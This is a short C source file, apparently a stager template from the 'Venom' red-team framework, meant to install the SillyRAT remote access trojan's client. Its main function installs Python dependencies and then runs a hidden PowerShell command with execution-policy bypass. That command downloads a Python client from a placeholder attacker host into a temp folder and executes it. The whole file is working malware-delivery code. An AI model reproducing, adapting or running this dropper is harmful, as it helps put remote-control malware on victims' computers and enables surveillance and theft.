/*
Author: r00t-3xp10it [SSA RedTeam @2020]
Framework: Venom v1.0.17 - Multi-OS - Agent nº 5
Function: This template its used to download/exec (Client.py) from attacker machine (LAN)
Mandatory dependencies: python3 and pip {tabulate pynput psutil pillow pyscreenshot pyinstaller}
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

int main()
{
 /* Install SillyRAT requirements if found python 3. Then Downloads/Executes the Client.py */
 system("powershell $C=pip show tabulate;If(-not($C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}");
 system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\FiLNaMe.py') && cd TempDir && python FiLNaMe.py");
 return 0;
}
